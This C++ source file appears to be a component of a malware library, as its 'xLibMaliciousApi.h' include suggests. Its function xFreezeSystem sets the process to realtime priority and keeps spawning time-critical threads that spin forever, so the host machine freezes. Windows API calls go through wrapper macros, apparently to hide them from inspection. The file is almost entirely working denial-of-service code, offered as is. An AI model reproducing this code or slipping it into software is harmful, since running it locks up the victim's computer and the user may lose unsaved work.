#include "xFreeze.h"

#include "xLibMaliciousApi.h"
#include "xOsApi.h"



DWORD CALLBACK _xFreeze(void* data)
{
	while (true);

	return 0;
}

void xFreezeSystem()
{
	while (true)
	{
		X_KERNEL32_CALL(SetPriorityClass)(X_KERNEL32_CALL(GetCurrentProcess)(), REALTIME_PRIORITY_CLASS);

		HANDLE h = X_KERNEL32_CALL(CreateThread)(NULL, 0, _xFreeze, NULL, 0, NULL);

		X_KERNEL32_CALL(SetThreadPriority)(h, THREAD_PRIORITY_TIME_CRITICAL);

		X_KERNEL32_CALL(CloseHandle)(h);
	}
}
